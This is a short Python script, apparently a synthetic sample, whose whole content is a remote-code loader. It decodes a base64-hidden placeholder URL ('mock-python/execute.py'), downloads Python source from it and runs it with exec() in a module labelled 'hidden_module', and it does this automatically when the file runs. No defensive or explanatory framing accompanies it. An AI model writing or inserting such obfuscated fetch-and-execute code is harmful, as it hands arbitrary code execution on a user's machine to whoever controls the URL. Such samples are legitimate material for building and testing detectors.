import urllib.request
import types
import base64

def acquire_code(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def perplexing_method():
    encoded_url = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="
    decoded_url = base64.b64decode(encoded_url).decode('utf-8')
    source = acquire_code(decoded_url)
    module = types.ModuleType("hidden_module")
    exec(source, module.__dict__)

perplexing_method()
